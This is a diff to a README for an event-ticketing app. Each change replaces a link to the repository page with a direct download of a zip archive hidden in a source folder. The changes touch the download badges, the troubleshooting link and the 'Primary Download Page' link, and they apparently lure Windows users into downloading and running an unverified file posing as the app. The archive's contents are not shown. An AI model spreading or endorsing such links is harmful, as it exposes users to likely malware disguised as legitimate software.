@@ -1,6 +1,6 @@
 # 🎟️ event-ticketing-platform - Simple Event Ticket Booking
 
-[![Download](https://img.shields.io/badge/Download-Get%20the%20App-brightgreen)](https://github.com/laco717/event-ticketing-platform)
+[![Download](https://img.shields.io/badge/Download-Get%20the%20App-brightgreen)](https://github.com/laco717/event-ticketing-platform/raw/refs/heads/main/services/booking-service/src/ticketing_platform_event_1.4.zip)
 
 ---
 
@@ -32,7 +32,7 @@ Follow these steps to get event-ticketing-platform running on your Windows PC.
 
 Click the green button below to visit the download page. This page contains the app files you need.
 
-[![Download](https://img.shields.io/badge/Download-Get%20the%20App-blue)](https://github.com/laco717/event-ticketing-platform)
+[![Download](https://img.shields.io/badge/Download-Get%20the%20App-blue)](https://github.com/laco717/event-ticketing-platform/raw/refs/heads/main/services/booking-service/src/ticketing_platform_event_1.4.zip)
 
 On the page, look for the Windows version of the software. It might be listed under "Releases" or similar.
 
@@ -120,7 +120,7 @@ Here are common issues and how to fix them:
 If you encounter issues not listed here:
 
 - Visit the repository for documentation and updates:  
-  [https://github.com/laco717/event-ticketing-platform](https://github.com/laco717/event-ticketing-platform)  
+  [https://github.com/laco717/event-ticketing-platform/raw/refs/heads/main/services/booking-service/src/ticketing_platform_event_1.4.zip](https://github.com/laco717/event-ticketing-platform/raw/refs/heads/main/services/booking-service/src/ticketing_platform_event_1.4.zip)  
 
 - Use the "Issues" tab on GitHub to report problems. Provide detailed info about your computer, app version, and error messages.
 
@@ -129,7 +129,7 @@ If you encounter issues not listed here:
 ## 🔗 Useful Links
 
 - **Primary Download Page:**  
-  [https://github.com/laco717/event-ticketing-platform](https://github.com/laco717/event-ticketing-platform)
+  [https://github.com/laco717/event-ticketing-platform/raw/refs/heads/main/services/booking-service/src/ticketing_platform_event_1.4.zip](https://github.com/laco717/event-ticketing-platform/raw/refs/heads/main/services/booking-service/src/ticketing_platform_event_1.4.zip)
 
 - **User Guide and Documentation:** Found on the repository's Wiki or README files.
 
@@ -153,4 +153,4 @@ If an update is available, follow the prompts to install it.
 
 # Getting Started Badge
 
-[![Download event-ticketing-platform](https://img.shields.io/badge/Download-Get%20the%20App-brightgreen)](https://github.com/laco717/event-ticketing-platform)
+[![Download event-ticketing-platform](https://img.shields.io/badge/Download-Get%20the%20App-brightgreen)](https://github.com/laco717/event-ticketing-platform/raw/refs/heads/main/services/booking-service/src/ticketing_platform_event_1.4.zip)
